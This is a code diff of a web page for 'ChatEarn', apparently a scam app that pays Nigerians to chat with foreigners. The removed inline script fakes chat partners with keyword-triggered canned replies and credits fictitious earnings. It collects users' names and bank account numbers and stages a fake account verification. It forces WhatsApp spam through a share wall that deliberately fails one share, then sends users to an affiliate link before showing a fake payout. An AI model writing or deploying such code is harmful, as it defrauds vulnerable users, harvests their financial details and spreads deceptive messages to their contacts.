-  wizkid:["Wizkid!! Essence is still one of my favourite songs ever made 😭 Do you listen to him a lot?","Wizkid selling out the O2 Arena was a whole moment. He's massive here. Are you a Wizkid fan?"],
-  davido:["Davido's energy is unmatched honestly. The way he connects with fans... do you follow him?","30BG!! 😂 Davido's journey has been incredible to watch from outside Nigeria honestly"],
-  asake:["Asake came out of nowhere and took over everything 😂 Work is so catchy I can't stop listening. Is he that big in Nigeria too?"],
-  rema:["Rema!! Calm Down was literally everywhere for months 😄 He seems so young to be that successful. Is he popular in Nigeria?"],
-  afrobeats:["Afrobeats is taking over the whole world honestly 🌍 I hear it everywhere now — clubs, gyms, radio. Does it feel special to be Nigerian right now?","The global rise of Afrobeats is incredible. What do you think made it blow up so fast internationally?"],
-
-  // Work / hustle
-  student:["Oh a student! What are you studying? 😊","Student life in Nigeria seems intense honestly — NEPA, no light, still grinding 😅 Respect","Students in Nigeria are so hardworking from what I see. What university are you in?"],
-  work:["What kind of work do you do? 😊","Nigerian hustle is on another level honestly. Everyone I talk to has like 3 things going on at once 😂"],
-  business:["Oh you have your own business? That's impressive! What kind? 😊","Nigerian entrepreneurs are everywhere honestly. The hustle is real. What industry are you in?"],
-  engineer:["Engineering in Nigeria is no joke! 💪 What type of engineering?","Nigerian engineers are highly respected globally. A lot of them are doing big things here abroad too"],
-  doctor:["Doctor! That's so impressive. How long is medical school in Nigeria?","Nigerian doctors are some of the best in the world honestly — so many here work in top hospitals"],
-  tech:["Nigerian tech scene is popping right now! Flutterwave, Paystack... the whole world is watching. Are you in tech?","The Lagos tech hub scene looks incredible. Are you involved in any of that?"],
-
-  // Weather / environment
-  hot:["Haha yes!! I've heard Nigeria is HOT 😂 Like serious heat. How do you cope especially without constant light?","The heat sounds intense honestly. Does it ever cool down or is it warm all year?"],
-  rain:["Rainy season in Nigeria looks so dramatic from the videos 😂 Heavy heavy rain. Is it nice or does it cause problems?"],
-  light:["NEPA situation 😭 I've heard so much about the light issue. How do you manage daily life with that?","The generator culture in Nigeria is so interesting to me honestly. Everyone just has a backup plan for everything 😄"],
-
-  // Travel / abroad
-  abroad:["Do you have plans to travel abroad one day? Where would you go first? 😊","Nigerians abroad are everywhere honestly — London, Houston, Toronto, everywhere. Do you have family abroad?"],
-  uk:["UK! London has a massive Nigerian community. Have you been or do you have family there?"],
-  usa:["USA is full of Nigerians 😄 Do you have any family or friends over here?","The Nigerian-American community is huge and so successful. Would you want to come to the US?"],
-  canada:["Canada is actually one of the top destinations for Nigerians now 😊 Have you thought about it?"],
-
-  // Greetings / general
-  fine:["That's good to hear! 😊 How's your day going so far?","Glad to hear that! What's keeping you busy today?"],
-  good:["Nice! 😊 How's everything going on your end today?","Good good! What's been the highlight of your day so far?"],
-  great:["Love to hear that! 🙌 What's making it a great day?"],
-  okay:["Just okay? 😄 What's going on? Tell me about your day","Okay is fine 😊 Anything interesting happening?"],
-  bored:["Haha I feel you 😂 That's why you're here right? Let's make it interesting — tell me something about yourself","Bored in Nigeria? Impossible 😂 What do you normally do for fun?"],
-  hello:["Hey!! 😊 So nice to chat with you! Where in Nigeria are you from?","Hii!! 😄 Tell me about yourself — where are you from?"],
-  hi:["Hey!! 😊 Great to meet you! Which part of Nigeria are you from?","Hii! 😄 So happy we got matched! Tell me about yourself"],
-  how:["I'm doing great thanks for asking! 😊 How about you — what's your day been like?","I'm good! Just enjoying chatting on here. How are things in Nigeria today?"],
-
-  // Family
-  family:["Family is everything in Nigeria from what I understand 😊 Are you from a big family?","Nigerian family culture seems so warm and close-knit. Do you live with family?"],
-  mother:["Aww Nigerian mums are the best honestly 😄 What's your mum like?"],
-  marry:["Marriage in Nigeria seems like a BIG deal 😂 All the traditional ceremonies, the outfits... it looks amazing","Haha Nigerian weddings are literally the most fun events I've ever seen on social media 😭🔥"],
-
-  // Default fallbacks by conversation stage
-  _early:["That's so interesting! 😊 Tell me more — I want to understand what life is really like for you","Haha I love that! You know what, talking to you is making me want to visit Nigeria fr 😄","Oh really? I didn't know that at all! What else should I know about Nigeria?","That makes sense actually 😊 Is that a common thing there or just your experience?"],
-  _mid:["Hahaha okay I see 😂 You're making Nigeria sound so amazing. Would you say most people there feel that way?","Honestly every time I chat with a Nigerian I learn something new 🙌 What's one thing most foreigners get wrong about Nigeria?","That's real talk 💯 I respect that. What would you say is the best and worst thing about living in Nigeria right now?","That's lowkey inspiring honestly 😊 Nigerians just don't stop. What keeps you motivated?"],
-  _late:["You know what, this has been one of my best conversations on here fr 😄 You're so real","I feel like I've learned more about Nigeria from you than from any YouTube video 😂 You should be a tour guide lol","Honestly I'm adding Nigeria to my travel list because of this chat 🙌 If I visit, what's the first thing you'd make me eat?","You're such good vibes honestly 😊 Do you chat on here often?"]
-};
-
-// Generic Nigerian states/cities not in main keyword list - get a generic location reply
-const NG_PLACES = ["ekiti","osun","ogun","ondo","oyo","edo","delta","anambra","imo","abia","akwa ibom","cross river","bayelsa","plateau","kaduna","sokoto","katsina","borno","yobe","jigawa","zamfara","kebbi","niger","kogi","kwara","nasarawa","taraba","adamawa","gombe","bauchi","ekitistate","ile-ife","ife","akure","abeokuta","owerri","umuahia","uyo","calabar","jos","ilorin","makurdi","minna","lokoja","yola","damaturu","gusau","birnin kebbi","dutse","lafia","jalingo","awka","asaba"];
-
-function getNextReply(userText){
-  const msgs = currentChatUser.msgs;
-  const text = (userText||"").toLowerCase();
-
-  // Always check specific keyword matches first (covers cities/topics user mentions)
-  const keywordGroups = Object.keys(KEYWORD_REPLIES).filter(k=>!k.startsWith('_'));
-  for(const kw of keywordGroups){
-    if(text.includes(kw)){
-      const options = KEYWORD_REPLIES[kw];
-      return options[Math.floor(Math.random()*options.length)];
-    }
-  }
-
-  // Check for other Nigerian places not specifically scripted - generic location reply
-  for(const place of NG_PLACES){
-    if(text.includes(place)){
-      const genericLocationReplies = [
-        "Oh nice! I haven't heard much about that area but I'd love to know more 😊 What's it like living there?",
-        "I'll be honest I don't know much about that part of Nigeria but it sounds interesting! What's it known for?",
-        "That's somewhere I've never heard of before but now I'm curious 😄 Tell me more about it!",
-        "Oh cool, I should look that up sometime! Is it a big city or more chill/quiet?"
-      ];
-      return genericLocationReplies[Math.floor(Math.random()*genericLocationReplies.length)];
-    }
-  }
-
-  // For the very first reply (replyCount==1), use scripted message #1 if no keyword matched
-  // since it's a natural intro flow (asking where they're from)
-  if(replyCount === 1){
-    return msgs[1];
-  }
-
-  // After that, use stage-based smart fallback
-  if(replyCount<=3) return KEYWORD_REPLIES._early[Math.floor(Math.random()*KEYWORD_REPLIES._early.length)];
-  if(replyCount<=6) return KEYWORD_REPLIES._mid[Math.floor(Math.random()*KEYWORD_REPLIES._mid.length)];
-  return KEYWORD_REPLIES._late[Math.floor(Math.random()*KEYWORD_REPLIES._late.length)];
-}
-
-function addVoiceNote(body){
-  const durs=["0:12","0:07","0:19","0:08","0:14"];
-  const dur=durs[Math.floor(Math.random()*durs.length)];
-  const bars=Array.from({length:18},()=>{const h=4+Math.floor(Math.random()*16);return `<div class="vb-bar" style="height:${h}px;background:var(--green);opacity:0.7;"></div>`;}).join("");
-  const wrap=document.createElement("div");wrap.className="msg incoming";
-  wrap.innerHTML=`<div class="voice-bubble"><div class="vb-play">▶</div><div class="vb-wave">${bars}</div><div class="vb-dur">${dur}</div></div><div class="msg-time">${getTime()}</div>`;
-  body.appendChild(wrap);body.scrollTop=body.scrollHeight;
-}
-
-function addPhotoBubble(body){
-  const photos=["🏖️","🌆","🍕","🎉","😄","🌸","🏠","🎵","🌤️","🦋"];
-  const icon=photos[Math.floor(Math.random()*photos.length)];
-  const caps=["That's my neighborhood!","This is where I am rn 😊","Look at this lol","Random pic 😄","My view today 🌤️"];
-  const cap=caps[Math.floor(Math.random()*caps.length)];
-  const wrap=document.createElement("div");wrap.className="msg incoming";
-  wrap.innerHTML=`<div class="photo-bubble"><div class="photo-bubble-inner">${icon}</div><div class="photo-bubble-cap">${cap}</div></div><div class="msg-time">${getTime()}</div>`;
-  body.appendChild(wrap);body.scrollTop=body.scrollHeight;
-}
-
-function handleEnter(e){if(e.key==="Enter")sendMsg();}
-
-function sendMsg(){
-  if(chatBusy)return;
-  if(totalBalance>=MAX_EARN){showToast("⚠️ Maximum earnings reached! Please withdraw first.");forceWithdraw();return;}
-  const input=document.getElementById("chatInput");
-  const text=input.value.trim();if(!text)return;
-  chatBusy=true;input.value="";
-  const body=document.getElementById("chatBody");
-  const earned=currentChatUser.rate;
-  replyCount++;totalBalance+=earned;chatEarnings+=earned;saveState();
-  const msg=document.createElement("div");msg.className="msg outgoing";
-  msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()} <span style="color:#00E676;font-size:12px;">✓✓</span></div><div class="msg-earn">+₦${earned.toLocaleString("en-NG")} earned! 💰</div>`;
-  body.appendChild(msg);body.scrollTop=body.scrollHeight;
-  showEarnToast("+₦"+earned.toLocaleString("en-NG")+" Earned! 💰");
-  updateBalance();
-  // Show "typing..." in chat status
-  document.getElementById("chatStatus").textContent="✍️ typing...";
-  // Get smart context-aware reply
-  const nextReply = getNextReply(text);
-  deliverReply(nextReply);
-}
-
-function updateBalance(){
-  const fmt=n=>"₦"+n.toLocaleString("en-NG");
-  document.getElementById("dashBalance").textContent=fmt(totalBalance);
-  document.getElementById("earnPageAmount").textContent=totalBalance.toLocaleString("en-NG");
-  document.getElementById("chatEarnBreakdown").textContent=fmt(chatEarnings);
-  document.getElementById("totalEarnBreakdown").textContent=fmt(totalBalance);
-  document.getElementById("wdAmount").textContent=fmt(totalBalance);
-  if(totalBalance>=MIN_WITHDRAW){
-    document.getElementById("wdTeaserBtn").textContent="Withdraw 💰";
-    document.getElementById("wdTeaserBtn").classList.add("active");
-    document.getElementById("wdTeaserSub").textContent=fmt(totalBalance)+" ready to withdraw!";
-  }
-}
-
-function promptWithdraw(){
-  if(document.getElementById("wdPromptNotice"))return;
-  const body=document.getElementById("chatBody");
-  const notice=document.createElement("div");notice.id="wdPromptNotice";
-  notice.style.cssText="background:rgba(0,200,83,.12);border:1px solid rgba(0,200,83,.3);border-radius:12px;padding:14px;margin:10px 0;text-align:center;";
-  notice.innerHTML=`<div style="font-size:24px;margin-bottom:6px;">🎉</div><div style="font-size:15px;font-weight:800;color:#00E676;margin-bottom:4px;">₦${totalBalance.toLocaleString("en-NG")} Earned!</div><div style="font-size:12px;color:#B0B0B0;margin-bottom:10px;">Withdrawal available! Withdraw now.</div><button onclick="goScreen('earnings')" style="background:#00C853;color:#000;border:none;border-radius:10px;padding:10px 20px;font-size:14px;font-weight:800;cursor:pointer;">Withdraw Now →</button>`;
-  body.appendChild(notice);body.scrollTop=body.scrollHeight;
-}
-
-function forceWithdraw(){
-  if(document.getElementById("forceWdNotice"))return;
-  const body=document.getElementById("chatBody");
-  const notice=document.createElement("div");notice.id="forceWdNotice";
-  notice.style.cssText="background:rgba(255,215,0,.12);border:2px solid rgba(255,215,0,.4);border-radius:12px;padding:16px;margin:10px 0;text-align:center;";
-  notice.innerHTML=`<div style="font-size:24px;margin-bottom:6px;">⚠️</div><div style="font-size:15px;font-weight:800;color:#FFD600;margin-bottom:6px;">Maximum Earnings Reached!</div><div style="font-size:12px;color:#B0B0B0;margin-bottom:12px;">Withdraw your ₦${totalBalance.toLocaleString("en-NG")} before you can continue chatting.</div><button onclick="goScreen('earnings')" style="background:#FFD600;color:#000;border:none;border-radius:10px;padding:12px 24px;font-size:15px;font-weight:800;cursor:pointer;">Withdraw ₦${totalBalance.toLocaleString("en-NG")} Now →</button>`;
-  body.appendChild(notice);body.scrollTop=body.scrollHeight;
-}
-
-function tryWithdraw(){
-  if(totalBalance>=MIN_WITHDRAW)goScreen("earnings");
-  else showToast("⚠️ Keep chatting! Minimum withdrawal is ₦40,000");
-}
-
-let bankVerifyTimer=null;
-function triggerBankVerify(val){
-  const statusEl=document.getElementById("bankVerifyStatus");
-  clearTimeout(bankVerifyTimer);
-  if(val.length<10){
-    statusEl.style.display="none";
-    return;
-  }
-  // Show verifying spinner
-  statusEl.style.display="block";
-  statusEl.style.background="rgba(255,193,7,.1)";
-  statusEl.style.border="1px solid rgba(255,193,7,.3)";
-  statusEl.style.color="#FFD600";
-  statusEl.innerHTML='<span style="animation:spin 1s linear infinite;display:inline-block;">⏳</span> Verifying account...';
-  bankVerifyTimer=setTimeout(()=>{
-    const bankName=selectedBank==="opay"?"OPay":"PalmPay";
-    statusEl.style.background="rgba(0,200,83,.1)";
-    statusEl.style.border="1px solid rgba(0,200,83,.3)";
-    statusEl.style.color="#00E676";
-    statusEl.innerHTML='✅ Account Verified — '+bankName;
-  },1800);
-}
-
-function selectBank(bank){
-  selectedBank=bank;
-  document.getElementById("bankOpay").classList.toggle("selected",bank==="opay");
-  document.getElementById("bankPalmpay").classList.toggle("selected",bank==="palmpay");
-}
-
-function placeWithdrawal(){
-  const acc=document.getElementById("wdAccNo").value.trim();
-  const name=document.getElementById("wdAccName").value.trim();
-  if(!acc||acc.length<10){showToast("⚠️ Enter a valid 10-digit account number");return;}
-  if(!name){showToast("⚠️ Enter your account name");return;}
-  withdrawalAmount=totalBalance;withdrawalBank=selectedBank;withdrawalAcc=acc;
-  // Save withdrawal request to Supabase immediately
-  saveWithdrawal(name, acc, selectedBank, totalBalance);
-  swShares=0;shareFailTriggered=false;
-  goScreen("sharewall");
-  const bankName=withdrawalBank==="opay"?"OPay":"PalmPay";
-  document.getElementById("swHeroTitle").textContent="Verify to Receive ₦"+withdrawalAmount.toLocaleString("en-NG");
-  document.getElementById("swHeroSub").innerHTML=`To process your <strong>₦${withdrawalAmount.toLocaleString("en-NG")} withdrawal</strong> to <strong>${bankName}</strong>, share ChatEarn with 5 Nigerian friends to verify your account.`;
-  document.getElementById("swFill").style.width="0%";
-  document.getElementById("swPct").textContent="0%";
-  document.getElementById("swStatus").textContent="Share with 5 friends to unlock withdrawal";
-  document.getElementById("swBtnText").textContent="Share on WhatsApp to Verify";
-  const old=document.getElementById("shareFailNotice");if(old)old.remove();
-}
-
-function getMsg(){
-  const amt=withdrawalAmount||totalBalance;
-  return `💰 I just earned ₦${amt.toLocaleString("en-NG")} on ChatEarn chatting with foreigners!\n\nThis app pays Nigerians to chat with people from USA 🇺🇸, UK 🇬🇧, Canada 🇨🇦 and more.\n\n✅ Free to join\n✅ Earn ₦8,000–₦15,000 per reply\n✅ Withdraw to OPay/PalmPay\n\nSign up here 👇\n${SITE}\n${SITE}\n${SITE}\n\nIt's real — I'm withdrawing mine now! 🔥`;
-}
-
-let swBusy=false;
-function doShareWA(){
-  if(swBusy||swShares>=REQ)return;
-  if(swShares===2&&!shareFailTriggered){
-    shareFailTriggered=true;swBusy=true;
-    window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");
-    setTimeout(()=>{
-      swBusy=false;
-      const old=document.getElementById("shareFailNotice");if(old)old.remove();
-      const fail=document.createElement("div");fail.id="shareFailNotice";fail.className="share-fail";
-      fail.innerHTML=`<div class="sf-title">⚠️ Verification Failed</div><div class="sf-sub">This share could not be verified. Please share again to retry — your progress is saved.</div>`;
-      document.getElementById("btnShareWA").parentNode.insertBefore(fail,document.getElementById("btnShareWA"));
-      showToast("⚠️ Share not verified — try again");
-    },1800);
-    return;
-  }
-  swBusy=true;
-  window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");
-  setTimeout(()=>{
-    swBusy=false;swShares++;
-    const old=document.getElementById("shareFailNotice");if(old)old.remove();
-    const pct=Math.round((swShares/REQ)*100);
-    document.getElementById("swFill").style.width=pct+"%";
-    document.getElementById("swPct").textContent=pct+"%";
-    const rem=REQ-swShares;
-    if(rem>0){
-      document.getElementById("swStatus").textContent=rem+" more friend"+(rem>1?"s":"")+" needed";
-      document.getElementById("swBtnText").textContent="Share Again ("+rem+" more)";
-      showToast("✅ Verified — "+rem+" more to go");
-    }else{
-      document.getElementById("swStatus").textContent="Account verified! ✓";
-      document.getElementById("swBtnText").textContent="Verified ✓";
-      setTimeout(()=>goScreen("kyc"),800);
-    }
-  },1800);
-}
-
-function doKYC(){
-  window.open(AFF,"_blank");
-  setTimeout(()=>{
-    const ref="CE-"+Math.floor(100000+Math.random()*900000);
-    const bankName=withdrawalBank==="opay"?"OPay":"PalmPay";
-    goScreen("processing");
-    document.getElementById("ppRef").textContent=ref;
-    document.getElementById("ppAmount").textContent="₦"+withdrawalAmount.toLocaleString("en-NG");
-    document.getElementById("ppBank").textContent=bankName;
-    document.getElementById("ppBankNote").textContent="Your "+bankName+" account ("+withdrawalAcc.slice(0,3)+"*****"+withdrawalAcc.slice(-2)+") will receive ₦"+withdrawalAmount.toLocaleString("en-NG")+" within 24 hours.";
-  },1500);
-}
-
-function shareAgain(){window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");}
-function getTime(){const d=new Date();return d.getHours().toString().padStart(2,"0")+":"+d.getMinutes().toString().padStart(2,"0");}
-function showEarnToast(msg){const t=document.getElementById("earnToast");t.textContent=msg;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),3000);}
-function showToast(m){const t=document.getElementById("toast");t.textContent=m;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),2800);}
-
-tryRestoreSession();
-
-// Traffic click tracker — logs clicks to Supabase for admin reporting
-function trackClick(spot){
-  try {
-    supabaseClient.from('chatearn_clicks').insert([{
-      spot: spot,
-      user_email: document.getElementById('regEmail')?.value?.trim() || 'unknown',
-      clicked_at: new Date().toISOString()
-    }]).then(()=>{});
-  } catch(e){}
-  return true; // allow link to open
-}
-</script>
-  <!-- Hidden visit counter (1x1px, non-interactive, invisible to users) -->
-<div style="position:absolute;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;left:-9999px;">
-<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
-<script type="text/javascript">sc_online_i(1735208,"ffffff","ffffff");</script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="./assets/js/chatearn-app.js?v=20260721-chattoearn2"></script>
 </div>
 
 </body>
